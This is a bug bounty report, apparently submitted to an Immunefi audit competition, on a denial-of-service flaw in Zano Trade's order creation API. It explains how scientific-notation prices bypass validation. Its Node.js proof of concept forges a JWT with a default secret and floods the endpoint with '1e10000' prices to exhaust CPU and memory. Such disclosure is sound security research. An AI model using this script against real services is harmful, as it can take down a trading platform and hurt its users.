# #48436 \[W\&A-Critical] Dos is possible through the order creation api

**Submitted on Jul 2nd 2025 at 04:45:27 UTC by @adhd for** [**IOP | Zano Trade**](https://immunefi.com/audit-competition/iop-zano-trade)

* **Report ID:** #48436
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/PRavaga/zano-p2p/blob/master/api/controllers/orders.controller.ts>
* **Impacts:**
  * Taking down the application/website

## Description

## Brief/Intro

The order creation api takes an price by verifying it using `validateTokensInput` but this is bypass-able using scientific notation.

## Vulnerability Details

The `validateTokensInput` function which validates the price if flawed it was there to prevent the big amounts but it fails to prevent the scientific notations.

So when an price of `1e10000` is passed it will be validated as an correct price but this is out of bound for the postgress so it will throw error.

Calling the api with this price multiple time will also call `Decimal.toFixed()` which is an cpu and ram intensive task so running with `1e100000` it will take up all the resources and result in an dos attack

## Impact Details

An attacker can turn down the whole process by sending tons of request to this endpoint causing the platform to go down and stop the trading and p2p and other feature website supports

## Proof of Concept

## Proof of Concept

If you run this below script you will see the cpu and ram usage spiked up to 100%

```
const axios = require('axios');
const jwt   = require('jsonwebtoken');

const JWT_SECRET = 'ChangeMe123!';         
const TARGET     = 'http://localhost:3000';

const ADDRESS = 'ZxCkZcmXVGbEW2jTcUUE4AP65Hfni4Sc56iFDB3n7y9B4ykhVGk7Zpu7SMPTR64ezEWJvXHQui84vDWY9bn8eoof15G2NgvGR'; // <- existing address
const ALIAS   = 'demoAlias';                                                 // <- matching alias

const token = jwt.sign({ address: ADDRESS, alias: ALIAS }, JWT_SECRET, {
  expiresIn: '24h',
});

const orderData = {
  pairId: 1,            
  side:  'limit',
  type:  'buy',
  price: '1e10000',    
  amount: '1',
};

const totalRequests = 1000;
let completedRequests = 0;

for (let i = 0; i < totalRequests; i++) {
  axios
    .post(`${TARGET}/api/orders/create`, { token, orderData })
    .then((res) => {
      console.log(`Request ${i+1}/${totalRequests}:`, res.status, res.data);
      completedRequests++;
      if (completedRequests === totalRequests) {
        console.log('All requests completed');
      }
    })
    .catch((err) => {
      console.error(`Request ${i+1}/${totalRequests}:`, err.response?.status, err.response?.data);
      completedRequests++;
      if (completedRequests === totalRequests) {
        console.log('All requests completed');
      }
    });
}
```
